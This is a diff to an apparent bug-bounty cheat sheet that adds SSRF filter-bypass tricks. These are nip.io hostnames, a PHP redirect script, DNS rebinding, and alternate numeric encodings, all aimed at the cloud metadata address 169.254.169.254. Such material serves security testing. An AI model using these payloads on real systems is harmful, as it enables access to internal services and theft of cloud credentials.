@@ -138,7 +138,40 @@ GET /vulnerable?id=../../
 Find an open redirect & you probably have SSRF.
 
 Or likely can hit internal endpoints.
+10- Use Hostnames Instead of IPs
 
+Use services like `http://nip.io` to bypass direct IP bans. 
+
+Here are some examples. All of these resolve to `169.254.169.254`.
+```
+http://169.254.169.254.nip.io
+http://169-254-169-254.nip.io
+http://a9fea9fe.nip.io (hexadecimal IP notation)
+```
+11- HTTP Redirects
+
+Use redirects from a custom domain to a blocked IP to catch applications off-guard! 
+
+Here’s a simple PHP script to perform the redirect.
+
+`<?php header(“Location: http://169.254.169.254/”) ?>`
+12- DNS Rebinding
+
+Use TOCTOU vulnerabilities, by providing alternating DNS responses to breach. 
+
+Set up a DNS server that responds with two different IPs on alternating requests, one is allowed through the `ip_is_blocked()` function, and the other is not.
+
+13-Non-Standard IP Notations
+
+Octal, hexadecimal, integer, IPv6 can bypass some IP blockages! 
+
+All these will be interpreted as `169.254.169.254`:
+```
+025177524776 (octal)
+0xa9fea9fe (hexadecimal)
+2852039166 (integer)
+::ffff:a9fe:a9fe (IPv6)
+```
 # Rate limit bypass
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
 # Line terminators
